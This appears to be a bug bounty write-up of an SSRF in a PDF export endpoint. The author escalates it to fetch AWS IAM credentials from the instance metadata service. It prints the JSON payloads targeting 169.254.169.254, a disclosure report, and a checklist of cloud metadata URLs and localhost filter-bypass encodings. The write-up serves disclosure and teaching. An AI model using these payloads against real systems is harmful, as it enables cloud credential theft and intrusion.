## The Program

A B2B analytics platform on Bugcrowd with a broad scope that included the main app, several subdomains, and an API. The program had been running for 2 years, had 180+ resolved reports, and paid up to $5,000 for critical server-side bugs.

This was not an "easy" program by the rubric — high competition, mature codebase. But it had one characteristic that made it worth looking at: the app was clearly cloud-hosted (AWS, based on the S3 URLs in page source), and any SSRF finding here would have real escalation potential via the IMDS (Instance Metadata Service).

**Target of interest**: a "Export report as PDF" feature, visible in the dashboard. Features that generate documents by rendering URLs on the server are historically rich territory for SSRF.

---

## The Recon

Clicking "Export as PDF" triggered this request:

```http
POST /api/export/pdf HTTP/1.1
Host: app.target.com
Content-Type: application/json

{
  "report_id": "rpt_8821",
  "format": "pdf",
  "include_cover": true
}
```

The response was a PDF of the dashboard page. Standard so far. But inspecting the PDF metadata revealed it was generated by **wkhtmltopdf** — a tool that renders HTML pages to PDF by fetching them with a headless browser. Critically, wkhtmltopdf follows redirects and can be tricked into fetching internal URLs.

The next step: look for any parameter that might influence *which URL* gets fetched. A second look at the endpoint with different report types showed a `custom_header_url` field in the documentation (found via a JS file referencing `/api/export/options`). This parameter accepted a URL for a custom cover page.

---

## The "Wait a Second..." Moment

The `custom_header_url` parameter accepted any URL. Testing with a Burp Collaborator callback confirmed the server was making an outbound HTTP request to whatever URL was provided.

```json
{
  "report_id": "rpt_8821",
  "format": "pdf",
  "custom_header_url": "https://your-collaborator.burpcollaborator.net/test"
}
```

The collaborator received a hit. The server was fetching that URL server-side, then embedding the response in the PDF.

This was SSRF — the question now was: how far can we push it?

**The escalation path on AWS**: if the server runs on an EC2 instance (or Lambda, ECS, etc.), the metadata endpoint at `http://169.254.169.254/latest/meta-data/` is accessible only from inside the instance. An SSRF that can reach that address can retrieve IAM credentials attached to the instance role.

---

## The Exploit

Direct request to the metadata endpoint:

```json
{
  "custom_header_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

The generated PDF contained the response: a role name (`analytics-app-prod-role`). One more request to retrieve the actual credentials:

```json
{
  "custom_header_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/analytics-app-prod-role"
}
```

The PDF now contained temporary AWS credentials:
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-04-22T14:32:00Z"
}
```

**Stop here** — this was the proof needed. Credentials were not used, not stored, and the report was filed immediately. Using the credentials to access AWS resources would have been out of scope and potentially illegal.

The IMDSv2 (a newer AWS protection) was not enforced on this instance, which is why the simple GET request worked. On instances with IMDSv2, an additional PUT request to get a session token is required first.

## The Report

```
Title: SSRF via custom_header_url parameter leads to AWS metadata credential exposure

Summary:
The PDF export endpoint accepts a custom_header_url parameter that is fetched
server-side without validation. The server runs on AWS EC2 without IMDSv2
enforcement, allowing retrieval of the instance's IAM credentials via the
metadata endpoint at 169.254.169.254.

Steps to Reproduce:
1. Authenticate and navigate to any report
2. POST to /api/export/pdf with:
   { "report_id": "any", "custom_header_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
3. Open the generated PDF
4. The PDF body contains the IAM role name
5. Repeat with the role name appended to the URL path
6. The PDF contains valid temporary AWS AccessKeyId, SecretAccessKey, and Token

Impact:
Full compromise of the EC2 instance IAM role. Depending on the permissions
attached to analytics-app-prod-role, this could include access to S3 buckets,
RDS databases, other AWS services, or lateral movement within the AWS account.

CVSS: 9.8 (Critical)
```

Response time: 4 hours to triage, confirmed critical. Payout in 7 days.

## The Takeaway

**The one-sentence insight**: any feature that fetches a URL server-side (PDF export, webhook tester, URL preview, image import) is a potential SSRF vector — always check if it reaches internal addresses.

**How to find similar bugs:**
- Search for features that "fetch" something: PDF export, link preview, webhook delivery, import from URL, screenshot service
- Check the request in Burp — find any `url`, `callback`, `webhook`, `src`, or `endpoint` parameters
- Test with a Burp Collaborator or interactsh URL to confirm outbound requests
- On confirmed SSRF: try `http://169.254.169.254/` (AWS), `http://metadata.google.internal/` (GCP), `http://169.254.169.254/metadata/` (Azure)
- Try `http://localhost/`, `http://127.0.0.1/`, and `http://[::1]/` for internal service access

**Common mistakes:**
- Giving up when the direct IP is blocked — try DNS rebinding, redirects, or alternate representations (`http://0x7f000001/`, `http://2130706433/`)
- Not checking for IMDSv2 — it requires an extra step but is not impossible to exploit
- Only testing AWS metadata — internal services on non-standard ports often have no authentication
